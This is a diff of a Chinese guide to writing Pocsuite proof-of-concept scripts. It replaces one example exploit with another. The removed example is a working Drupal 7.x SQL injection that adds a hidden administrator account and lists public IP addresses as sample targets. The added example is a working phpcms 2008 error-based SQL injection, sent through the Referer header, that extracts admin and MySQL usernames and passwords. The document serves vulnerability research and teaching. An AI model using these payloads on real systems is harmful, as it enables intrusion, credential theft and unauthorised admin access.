@@ -277,90 +277,90 @@ json 格式的 PoC 类似于完形填空,只需要填写相应的字段的值即
 
 <h2 id="pocexample">PoC 代码示例</h2>
 
-<h3 id="pyexample">PoC py代码示例</h3>
+<h3 id="pyexample">PoC py代码示例</h3> [Python 代码模版](./template.py)
 
-[Drupal 7.x /includes/database/database.inc SQL注入漏洞](http://www.sebug.net/vuldb/ssvid-88927) PoC:
+[phpcms_2008_/ads/include/ads_place.class.php_sql注入漏洞](http://www.sebug.net/vuldb/ssvid-62274) PoC:
+
 ```
 #!/usr/bin/env python
 # coding: utf-8
-import urllib
-import random
-import string
-from collections import OrderedDict
-
+import re
+import urlparse
 from pocsuite.net import req
 from pocsuite.poc import POCBase, Output
 from pocsuite.utils import register
 
 
 class TestPOC(POCBase):
-    vulID = '1571'  # vul ID
+    vulID = '62274'  # ssvid
     version = '1'
-    author = 'zhengdt'
-    vulDate = '2014-10-16'
-    createDate = '2014-10-16'
-    updateDate = '2014-10-16'
-    references = ['https://www.sektioneins.de/en/blog/14-10-15-drupal-sql-injection-vulnerability.html']
-    name = 'Drupal 7.x /includes/database/database.inc SQL注入漏洞 POC'
-    appPowerLink = 'https://www.drupal.org/'
-    appName = 'Drupal'
-    appVersion = '7.x'
+    author = ['Medici.Yan']
+    vulDate = '2011-11-21'
+    createDate = '2015-09-23'
+    updateDate = '2015-09-23'
+    references = ['http://www.sebug.net/vuldb/ssvid-62274']
+    name = '_62274_phpcms_2008_place_sql_inj_PoC'
+    appPowerLink = 'http://www.phpcms.cn'
+    appName = 'PHPCMS'
+    appVersion = '2008'
     vulType = 'SQL Injection'
     desc = '''
-        Drupal 在处理 IN 语句时，展开数组时 key 带入 SQL 语句导致 SQL 注入，
-        可以添加管理员、造成信息泄露。
+        phpcms 2008 中广告模块，存在参数过滤不严，
+        导致了sql注入漏洞，如果对方服务器开启了错误显示，可直接利用，
+        如果关闭了错误显示，可以采用基于时间和错误的盲注
     '''
-
-    samples = ['http://216.119.147.168/', 'http://69.172.67.176/']
+    samples = ['http://10.1.200.28/']
 
     def _attack(self):
         result = {}
-        vul_url = '%s/?q=node&destination=node' % self.url
-        uid = int(random.random() * 1000)
-        username = ''.join(random.sample(string.letters+string.digits, 5))
-        payload = OrderedDict()
-
-        if not self._verify(verify=False):
-            return self.parse_attack(result)
-
-        payload['name[0;insert into users(uid, name, pass, status, data) values (%d, \'%s\', ' \
-                '\'$S$DkIkdKLIvRK0iVHm99X7B/M8QC17E1Tp/kMOd1Ie8V/PgWjtAZld\', 1, \'{b:0;}\');' \
-                'insert into users_roles(uid, rid) values (%d, 3);#]' % (uid, username, uid)] \
-                 = 'test'
-        payload['name[0]'] = 'test2'
-        payload['pass'] = 'test'
-        payload['form_id'] = 'user_login_block'
-
-        #print urllib.urlencode(payload)
-        response = req.post(vul_url, data=payload)
-        if response.status_code == 200:
-            result['AdminInfo'] = {}
-            result['AdminInfo']['Username'] = username
-            result['AdminInfo']['Password'] = 'thanks'
+        # 尝试获取 phpcms_member
+        payload = "SELECT concat(char(45,45),username,char(45,45,45),password,char(45,45)) from phpcms_member limit 1"
+        resp = self.do_sqlinji(payload)
+        if resp:
+            match_result = re.search(r'--(.+)---(.+)--', resp, re.I | re.M)
+            if match_result:
+                result['AdminInfo'] = {}
+                result['AdminInfo']['Username'] = match_result.group(1)
+                result['AdminInfo']['Password'] = match_result.group(2)
+        # 尝试获取 Mysql 用户名和密码
+        payload1 = "SELECT concat(char(45,45),user,char(45,45,45),password,char(45,45)) from mysql.user limit 1"
+        resp = self.do_sqlinji(payload1)
+        if resp:
+            match_result = re.search(r'--(.+)---(.+)--', resp, re.I | re.M)
+            if match_result:
+                result['DBInfo'] = {}
+                result['DBInfo']['Username'] = match_result.group(1)
+                result['DBInfo']['Password'] = match_result.group(2)
 
         return self.parse_attack(result)
 
-    def _verify(self, verify=True):
+    def _verify(self):
         result = {}
-        vul_url = '%s/?q=node&destination=node' % self.url
-        payload = {
-            'name[0 and (select 1 from (select count(*),concat((select md5(715890248' \
-                '135)),floor(rand(0)*2))x from  information_schema.tables group by x' \
-                ')a);;#]': 'test',
-            'name[0]': 'test2',
-            'pass': 'test',
-            'form_id': 'user_login_block',
-        }
-
-        response = req.post(vul_url, data=payload).content
-        if 'e4f5fd37a92eb41ba575c81bf0d31591' in response:
+        vulurl = urlparse.urljoin(self.url, '/data/js.php?id=1')
+        payload = "SELECT md5(1)"
+        resp = self.do_sqlinji(payload)
+        if resp and 'c4ca4238a0b923820dcc509a6f75849b' in resp:
             result['VerifyInfo'] = {}
-            result['VerifyInfo']['URL'] = self.url
-            result['VerifyInfo']['Payload'] = urllib.urlencode(payload)
+            result['VerifyInfo']['URL'] = vulurl
 
         return self.parse_attack(result)
+
+    def do_sqlinji(self, payload_sql):
+        # 封装每次请求, 只需要传入 SQL 语句自动封装 payload.
+        vulurl = urlparse.urljoin(self.url, '/data/js.php?id=1')
+        payload = "1', (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(%s))a from information_schema.tables group by a)b), '0')#" % payload_sql
+        head = {
+            'Referer': payload
+        }
+        resp = req.get(vulurl, headers=head)
+        if resp.status_code == 200:
+            match_result = re.search(r'Duplicate entry \'1(.+)\' for key', resp.content, re.I | re.M)
+            if match_result:
+                return match_result.group(1)
+        return None
 
     def parse_attack(self, result):
+        #封装输出
         output = Output(self)
         if result:
             output.success(result)
@@ -368,11 +368,12 @@ class TestPOC(POCBase):
             output.fail('Internet nothing returned')
         return output
 
+
 register(TestPOC)
 
 ```
 
-<h3 id="jsonexample">PoC json代码示例</h3>
+<h3 id="jsonexample">PoC json代码示例</h3>  [json 代码模版](./template.json)
 [phpcms_2008_/ads/include/ads_place.class.php_sql注入漏洞](http://www.sebug.net/vuldb/ssvid-62274) PoC:
 
 由于json不支持注释,所以具体字段意义请参考上文，涉及到的靶场请自行根据Sebug漏洞详情搭建。
